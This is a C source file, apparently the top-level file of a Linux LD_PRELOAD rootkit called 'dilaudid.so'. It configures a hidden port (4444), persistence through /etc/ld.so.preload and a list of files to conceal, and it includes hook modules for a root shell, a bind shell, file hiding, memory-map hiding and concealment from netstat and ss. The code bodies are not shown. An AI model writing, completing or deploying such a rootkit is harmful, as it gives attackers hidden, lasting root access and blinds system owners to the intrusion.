#define _GNU_SOURCE
#include <stdio.h>

/* ========================================================================== */
/*                      CENTRAL CONFIGURATION TUNING                          */
/* ========================================================================== */

#define PORT_TO_HIDE       4444
#define PORT_TO_HIDE_HEX  "115C"
#define PRELOAD_PATH      "/etc/ld.so.preload"
#define DUMMY_PRELOAD     "/etc/ld.so.preload.dummy"
#define LIB_TO_HIDE       "dilaudid.so"
#define HIDE_LIST         "dilaudid.so,ld.so.preload.dummy"

// Global thread-local re-entrancy guard variable
__thread int inside_hook = 0;

/* ========================================================================== */
/*                          MODULAR HOOK INCLUSIONS                           */
/* ========================================================================== */

#include "src/rootshell.h"
#include "src/files.h"
#include "src/netstat.h"
#include "src/ss.h"
#include "src/memhide.h"    
#include "src/bindshell.h"

